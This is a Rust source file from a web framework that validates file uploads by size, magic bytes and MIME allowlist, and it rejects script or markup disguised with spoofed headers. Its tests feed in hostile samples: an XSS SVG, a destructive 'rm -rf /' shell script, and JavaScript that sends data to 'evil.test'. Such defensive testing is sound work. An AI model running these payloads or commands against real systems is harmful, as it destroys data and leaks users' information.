//! Upload validators. Composable via tuple impls - `(ImageFile, MaxSize<N>)`
//! runs both. Implementations are `Default`-constructed inside the
//! derive macro; unit structs auto-impl `Default`, parameterized
//! built-ins use phantom types so a `Default` ctor is meaningful.
//!
//! # Streaming-aware signature
//!
//! Because parts above the configured spill threshold no longer keep their
//! full contents in memory, validators receive a bounded **sniff buffer**
//! (the first ~16 KiB of the part, sufficient for magic-byte detection)
//! plus the **total accumulated size** in bytes. Validators that care
//! about content (e.g. [`ImageFile`], [`MimeType`]) consult `sniff`; validators
//! that care about size (e.g. [`MaxSize`]) consult `size`.
//!
//! # Refusing a file
//!
//! A validator answers in one of two ways. A file it refuses as invalid
//! input returns [`FrameworkError::invalid_upload`] with a catalog-keyed
//! message, which the extractor reports as a 422 under the field's input
//! name. Any other error is a failure to check the file and keeps its own
//! status.

use crate::FrameworkError;
use crate::validation::message::ValidationMessage;

/// Streaming upload validator.
///
/// # Lifecycle
///
/// For each declared `UploadedFile<V>` field on a `#[derive(MultipartRequest)]`
/// struct, the derive macro constructs a single `V` instance via
/// `Default::default()` at the start of request handling and reuses it
/// across **both** [`validate_chunk`](Self::validate_chunk) and
/// [`validate_final`](Self::validate_final) calls for that field.
///
/// # State
///
/// Both methods take `&self`. If your validator needs to accumulate
/// state across chunks (e.g. a rolling hash, a running CRC), use
/// **interior mutability** (`std::cell::Cell`, `std::sync::Mutex`,
/// `std::sync::atomic::*`). Because the same `&V` is threaded through
/// every chunk and the final check, your interior-mutability state
/// is coherent across the entire upload.
///
/// # Composition
///
/// Tuple impls run validators in declaration order:
/// `(ImageFile, MaxSize<5_242_880>)` runs `ImageFile::validate_chunk` first,
/// then `MaxSize::validate_chunk` (per chunk); `validate_final` runs in
/// the same order. Short-circuits on first `Err`.
///
/// # Errors
///
/// Return [`FrameworkError::invalid_upload`] for a file that is invalid
/// input, so the client gets a 422 under the field's name with a message an
/// application can translate. Return any other `FrameworkError` for a
/// failure to check the file; it answers with its own status.
pub trait UploadValidator: Send + Sync + Default {
    /// Called after each chunk lands.
    ///
    /// - `sniff` is the first up to 16 KiB of the part (truncated when
    ///   the part is smaller), sufficient for magic-byte detection via
    ///   `infer::get`. The buffer never grows past 16 KiB regardless of
    ///   part size.
    /// - `size` is the running total of bytes received for this part.
    ///
    /// Return `Err` to short-circuit oversized uploads at the chunk
    /// boundary: the extractor reads no further byte of the body. Size-based
    /// validators (`MaxSize<N>`) check `size`; content-based validators
    /// don't usually need to act per-chunk.
    fn validate_chunk(&self, sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        let _ = (sniff, size);
        Ok(())
    }

    /// Called once when the part is fully received.
    ///
    /// - `sniff` is the bounded 16 KiB prefix captured during parsing
    ///   (same buffer threaded through `validate_chunk`).
    /// - `size` is the final byte count.
    /// - `content_type` is the client-declared `Content-Type` header.
    ///   Untrusted - content sniffers should rely on `sniff`.
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        content_type: Option<&str>,
    ) -> Result<(), FrameworkError> {
        let _ = (sniff, size, content_type);
        Ok(())
    }
}

/// No-op validator - `UploadedFile<()>` accepts any bytes.
impl UploadValidator for () {}

/// `MaxSize<N>` - short-circuits at byte boundary when accumulated > N.
///
/// A file over the limit is invalid input (`validation-max-file`), reported
/// with the limit in kilobytes as Laravel's `max` rule words it.
#[derive(Default)]
pub struct MaxSize<const N: usize>;

impl<const N: usize> UploadValidator for MaxSize<N> {
    fn validate_chunk(&self, _sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        if size > N as u64 {
            return Err(FrameworkError::invalid_upload(max_file_message(N)));
        }
        Ok(())
    }
    fn validate_final(
        &self,
        _sniff: &[u8],
        size: u64,
        _ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        self.validate_chunk(&[], size)
    }
}

/// `ImageFile` - rejects anything whose magic bytes don't claim image/*.
///
/// Named after Laravel's own `Illuminate\Validation\Rules\ImageFile`, which
/// is exactly this rule class. The bare `Image` name belongs to the
/// image-manipulation pipeline in `suprnova::media`, matching
/// `Illuminate\Image\Image`. Deliberately not an intra-doc link: this module
/// is ungated, that type only exists under the `media` feature, and
/// `rustdoc::broken_intra_doc_links` is denied crate-wide - so a link here
/// would break `cargo rustdoc --no-default-features`.
#[derive(Default)]
pub struct ImageFile;

impl UploadValidator for ImageFile {
    fn validate_final(
        &self,
        sniff: &[u8],
        _size: u64,
        _ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        // `infer::get` only needs the first ~32 bytes for every format it
        // recognises; the bounded sniff buffer (≤ 16 KiB) is generous.
        // Unidentifiable bytes are not an image either.
        match infer::get(sniff) {
            Some(kind) if kind.mime_type().starts_with("image/") => Ok(()),
            _ => Err(FrameworkError::invalid_upload(
                ValidationMessage::keyed("validation-image").fallback("The file must be an image."),
            )),
        }
    }
}

/// `MimeType<L>` - accepts a fixed list provided by an allowlist type.
pub trait MimeAllowlist: Send + Sync + Default {
    /// The set of allowed MIME types.
    fn allowed() -> &'static [&'static str];
}

/// Resolve the effective MIME type for a part against an allowlist.
///
/// The detected type from `infer::get` (magic-byte sniffing of the actual
/// content) is authoritative and is matched against `allowed`. The
/// client-declared `Content-Type` is consulted **only** when `infer`
/// cannot recognise the bytes, and only for a type `infer` has no magic
/// bytes for (`text/csv`, `application/json`): a declared `image/png` on
/// bytes `infer` did not recognise as a PNG is a false claim. Markup and
/// script payloads are rejected before the header is read at all, so a
/// text file (SVG, HTML, JS) carrying a spoofed binary header can never
/// satisfy an image allowlist.
fn validate_against_allowlist(
    sniff: &[u8],
    size: u64,
    content_type: Option<&str>,
    allowed: &[&str],
) -> Result<(), FrameworkError> {
    let refused = || FrameworkError::invalid_upload(mimetypes_message(allowed));

    if let Some(kind) = infer::get(sniff) {
        // Detected via magic bytes - the content itself, not the header.
        if allowed.iter().any(|m| *m == kind.mime_type()) {
            return Ok(());
        }
        return Err(refused());
    }

    // `infer` could not recognise the bytes. Text-based payloads (SVG,
    // HTML, XML, scripts) live here, and they are exactly what an attacker
    // would smuggle behind a spoofed binary `Content-Type`. Reject any
    // part whose leading bytes look like markup or a script before
    // considering the (untrusted) client header at all.
    let content = sniff_content(sniff);
    if looks_like_markup_or_script(content) {
        return Err(refused());
    }
    // Only the first `SNIFF_BYTES` of a part are kept for sniffing. A window
    // of nothing but whitespace says nothing about what follows it, and
    // markup placed past it would otherwise reach the header fallback
    // unseen. A part that is whitespace end to end was seen in full.
    if content.is_empty() && size > sniff.len() as u64 {
        return Err(refused());
    }

    // Genuinely unidentifiable, non-markup bytes: fall back to the client
    // header as the only remaining signal. A missing header is a reject.
    let declared = content_type
        .map(|ct| ct.split(';').next().unwrap_or(ct).trim())
        .filter(|ct| !ct.is_empty())
        .ok_or_else(refused)?;

    // A type `infer` knows the magic bytes of would have been detected
    // above. Bytes it did not recognise are not that type, whatever the
    // header says - script text declared `image/png` is the case this
    // closes, since it carries no markup marker for the check above.
    if infer::is_mime_supported(&declared.to_ascii_lowercase()) {
        return Err(refused());
    }

    if !allowed.iter().any(|m| m.eq_ignore_ascii_case(declared)) {
        return Err(refused());
    }
    Ok(())
}

/// `validation-mimetypes`, naming the allowed types as Laravel's
/// `mimetypes` rule does.
fn mimetypes_message(allowed: &[&str]) -> ValidationMessage {
    let values = allowed.join(", ");
    ValidationMessage::keyed("validation-mimetypes")
        .arg("values", values.clone())
        .fallback(format!("The file must be a file of type: {values}."))
}

/// `validation-max-file` for a limit of `max_bytes`. Laravel's `max` rule
/// takes a file limit in kilobytes and its message repeats that number, so
/// the limit is stated in kilobytes: whole when it divides evenly, else
/// rounded down to two decimal places, so a file within the stated limit
/// always passes.
fn max_file_message(max_bytes: usize) -> ValidationMessage {
    let kilobytes = if max_bytes.is_multiple_of(1024) {
        serde_json::Value::from(max_bytes / 1024)
    } else {
        serde_json::Value::from((max_bytes as f64 / 1024.0 * 100.0).floor() / 100.0)
    };
    ValidationMessage::keyed("validation-max-file")
        .arg("max", kilobytes.clone())
        .fallback(format!(
            "The file must not be greater than {kilobytes} kilobytes."
        ))
}

/// The sniff buffer past a UTF-8 BOM and leading whitespace, so leading
/// indentation does not defeat the checks that read it.
fn sniff_content(sniff: &[u8]) -> &[u8] {
    let bytes = sniff.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(sniff);
    let start = bytes
        .iter()
        .position(|b| !b.is_ascii_whitespace())
        .unwrap_or(bytes.len());
    &bytes[start..]
}

/// Heuristic: do the leading bytes of `content` (see [`sniff_content`])
/// look like text markup (SVG/HTML/XML) or a script? Used to reject text
/// payloads that `infer` does not recognise before any client-header
/// fallback.
fn looks_like_markup_or_script(content: &[u8]) -> bool {
    // First non-whitespace byte being `<` covers SVG, HTML, XML (incl.
    // `<?xml`, `<!DOCTYPE`, `<svg`, `<html`, `<script`).
    if content.first() == Some(&b'<') {
        return true;
    }
    // Common script shebang.
    content.starts_with(b"#!")
}

/// Upload validator that rejects parts whose effective MIME type is not in
/// the allowlist `L::allowed()`.
///
/// The check is driven by magic-byte sniffing of the actual content; the
/// client-sent `Content-Type` is only ever a fallback for bytes `infer`
/// cannot recognise, and never lets a markup/script payload through.
#[derive(Default)]
pub struct MimeType<L: MimeAllowlist>(std::marker::PhantomData<L>);

impl<L: MimeAllowlist + 'static> UploadValidator for MimeType<L> {
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        validate_against_allowlist(sniff, size, ct, L::allowed())
    }
}

/// Tuple composition. `Default` for tuples up to 12 is provided by std.
impl<A, B> UploadValidator for (A, B)
where
    A: UploadValidator,
    B: UploadValidator,
{
    fn validate_chunk(&self, sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        self.0.validate_chunk(sniff, size)?;
        self.1.validate_chunk(sniff, size)
    }
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        self.0.validate_final(sniff, size, ct)?;
        self.1.validate_final(sniff, size, ct)
    }
}

impl<A, B, C> UploadValidator for (A, B, C)
where
    A: UploadValidator,
    B: UploadValidator,
    C: UploadValidator,
{
    fn validate_chunk(&self, sniff: &[u8], size: u64) -> Result<(), FrameworkError> {
        self.0.validate_chunk(sniff, size)?;
        self.1.validate_chunk(sniff, size)?;
        self.2.validate_chunk(sniff, size)
    }
    fn validate_final(
        &self,
        sniff: &[u8],
        size: u64,
        ct: Option<&str>,
    ) -> Result<(), FrameworkError> {
        self.0.validate_final(sniff, size, ct)?;
        self.1.validate_final(sniff, size, ct)?;
        self.2.validate_final(sniff, size, ct)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// PNG magic bytes followed by enough of an IHDR header that
    /// `infer::get` recognises the part as `image/png`.
    const PNG_HEADER: &[u8] = &[
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44,
        0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00,
    ];

    #[derive(Default)]
    struct OnlyPng;
    impl MimeAllowlist for OnlyPng {
        fn allowed() -> &'static [&'static str] {
            &["image/png"]
        }
    }

    fn run(sniff: &[u8], ct: Option<&str>) -> Result<(), FrameworkError> {
        MimeType::<OnlyPng>::default().validate_final(sniff, sniff.len() as u64, ct)
    }

    #[test]
    fn genuine_png_passes() {
        assert!(run(PNG_HEADER, Some("image/png")).is_ok());
        // Detection is byte-driven; even a missing/wrong header passes
        // because the magic bytes are authoritative.
        assert!(run(PNG_HEADER, None).is_ok());
        assert!(run(PNG_HEADER, Some("application/octet-stream")).is_ok());
    }

    #[test]
    fn svg_with_spoofed_png_header_is_rejected() {
        let svg = br#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#;
        let err = run(svg, Some("image/png")).expect_err("spoofed SVG must be rejected");
        assert_eq!(err.status_code(), 422);
    }

    #[test]
    fn html_with_spoofed_png_header_is_rejected() {
        let html = b"<!DOCTYPE html><html><body><script>steal()</script></body></html>";
        assert!(run(html, Some("image/png")).is_err());
        // Leading whitespace must not defeat the markup check.
        let padded = b"   \n\t<html></html>";
        assert!(run(padded, Some("image/png")).is_err());
    }

    #[test]
    fn script_shebang_with_spoofed_header_is_rejected() {
        let script = b"#!/bin/sh\nrm -rf /\n";
        assert!(run(script, Some("image/png")).is_err());
    }

    #[derive(Default)]
    struct OnlyCsv;
    impl MimeAllowlist for OnlyCsv {
        fn allowed() -> &'static [&'static str] {
            &["text/csv"]
        }
    }

    fn run_csv(sniff: &[u8], size: u64, ct: Option<&str>) -> Result<(), FrameworkError> {
        MimeType::<OnlyCsv>::default().validate_final(sniff, size, ct)
    }

    #[test]
    fn unidentifiable_bytes_fall_back_to_the_header_only_for_types_magic_cannot_detect() {
        // `text/csv` has no magic bytes, so for bytes infer cannot
        // classify the client header is the only signal left.
        let csv = b"name,email\nann,ann@example.com\n";
        assert!(run_csv(csv, csv.len() as u64, Some("text/csv")).is_ok());
        assert!(run_csv(csv, csv.len() as u64, Some("text/csv; charset=utf-8")).is_ok());
        // Wrong / missing header on unidentifiable bytes is rejected.
        assert!(run_csv(csv, csv.len() as u64, Some("text/plain")).is_err());
        assert!(run_csv(csv, csv.len() as u64, None).is_err());

        // `image/png` does have magic bytes. Bytes infer cannot classify
        // are therefore not a PNG, whatever the header claims.
        let opaque = &[0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        assert!(run(opaque, Some("image/png")).is_err());
        assert!(run(opaque, Some("IMAGE/PNG; charset=binary")).is_err());
    }

    /// Script text carries no `<` or `#!` marker, so the markup check
    /// alone let it through on a spoofed image header.
    #[test]
    fn script_text_behind_a_spoofed_image_header_is_rejected() {
        let script = b"fetch('/api/me').then(r => r.text()).then(t => navigator.sendBeacon('//evil.test', t));";
        let err = run(script, Some("image/png")).expect_err("script text is not a PNG");
        assert_eq!(err.status_code(), 422);
    }

    /// Only the first 16 KiB of a part is sniffed. A sniff window of pure
    /// whitespace says nothing about what follows it, so markup placed
    /// past the window must not reach the header fallback.
    #[test]
    fn content_hidden_past_a_whitespace_sniff_window_is_rejected() {
        let window = vec![b' '; 16 * 1024];
        assert!(
            run_csv(&window, window.len() as u64 + 64, Some("text/csv")).is_err(),
            "the bytes after the window were never inspected"
        );
        // A part that is whitespace end to end was inspected in full.
        assert!(run_csv(&window, window.len() as u64, Some("text/csv")).is_ok());
    }

    fn refused_key(result: Result<(), FrameworkError>) -> String {
        match result {
            Err(FrameworkError::InvalidUpload(message)) => message.key.into_owned(),
            other => panic!("expected a refused file, got {other:?}"),
        }
    }

    #[test]
    fn built_in_refusals_are_validation_failures_with_catalog_keys() {
        assert_eq!(
            refused_key(MaxSize::<2048>.validate_chunk(&[], 2049)),
            "validation-max-file"
        );
        assert_eq!(
            refused_key(ImageFile.validate_final(b"%PDF-1.4", 8, None)),
            "validation-image"
        );
        assert_eq!(
            refused_key(ImageFile.validate_final(&[0u8; 8], 8, None)),
            "validation-image"
        );
        assert_eq!(
            refused_key(run(b"<svg/>", Some("image/png"))),
            "validation-mimetypes"
        );
        assert_eq!(
            refused_key(run(&[1u8, 2, 3, 4], None)),
            "validation-mimetypes"
        );
    }

    #[test]
    fn the_messages_carry_laravels_arguments() {
        assert_eq!(max_file_message(2048).args["max"], serde_json::json!(2));
        // Rounded down: a file within the stated limit always passes.
        assert_eq!(max_file_message(1000).args["max"], serde_json::json!(0.97));
        assert_eq!(
            mimetypes_message(&["image/png", "image/jpeg"]).args["values"],
            "image/png, image/jpeg"
        );
    }
}
